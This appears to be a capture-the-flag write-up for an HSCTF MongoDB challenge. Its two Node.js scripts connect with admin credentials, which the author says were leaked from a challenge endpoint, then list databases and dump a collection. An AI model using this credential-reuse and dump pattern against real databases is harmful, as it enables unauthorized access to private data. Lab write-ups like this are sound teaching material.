# Kieth Logger
```javascript
var MongoClient = require('mongodb').MongoClient;
var url = "mongodb://admin:keithkeithkeith@keith-logger-mongodb.web.chal.hsctf.com:27017/database?authSource=admin";

MongoClient.connect(url, function(err, db) {
  if (err) throw err;
  var dbo = db.db("database");
  dbo.collection("collection").find({}, function(err, result) {
    if (err) throw err;
    result.toArray(function(e,a){console.log(a)})
    db.close();
  });
})
```

This one's super easy. You build the monbodb URL. We get the username and password from one of the endpoints on the http server
Then, we built the URL. When I did it the first time, it didn't work. Turns out, you have to have a little queryString type deal and set the auth source to admin

I don't have the script I used to list the available databases because I did it using the higher-level mongoose mongodb driver. 

I ended up having to re-write the script with the mongodb driver because I wasn't able to access some of the lower level calls, but I was still able to get a listing of the available databases and collections (in order to know what values to look for, and what database to select)

Here's the old script:

```javascript
const mongoose=require("mongoose")
const Admin = mongoose.mongo.Admin;
const conn=mongoose.createConnection("mongodb://admin:keithkeithkeith@keith-logger-mongodb.web.chal.hsctf.com:27017/database?authSource=admin")

conn.on("open",function(){
    new Admin(conn.db).listDatabases(function(err, result) {
//        console.log('listDatabases succeeded');
        // database list stored in result.databases
       // console.log(result.databases);
    });

   //conn.db.listCollections().toArray(function(e,arr){console.log(arr)})
   conn.db.collection("collection").find({},function(e,res){console.log(res)})
})```
this second one is more or less cut-and-pasted from stackoverflow
